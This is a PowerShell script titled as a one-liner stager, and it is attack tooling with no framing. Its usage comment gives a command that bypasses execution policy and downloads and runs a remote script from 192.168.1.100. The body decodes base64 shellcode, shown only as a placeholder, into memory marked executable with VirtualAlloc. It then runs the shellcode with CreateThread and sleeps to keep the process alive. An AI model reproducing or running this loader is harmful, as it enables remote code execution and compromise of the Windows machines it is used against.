# powershell_stager.ps1 - One-liner stager
# Usage: powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/stage.ps1')"

# Base64-encoded payload (self-contained)
$shellcode = [System.Convert]::FromBase64String("BASE64_ENCODED_SHELLCODE_HERE")
$pinvoke = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@
$method = Add-Type -MemberDefinition $pinvoke -Name "Win32" -Namespace "Win32Functions" -PassThru
[IntPtr]$addr = $method::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $shellcode.Length)
$method::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
Start-Sleep -Seconds 86400
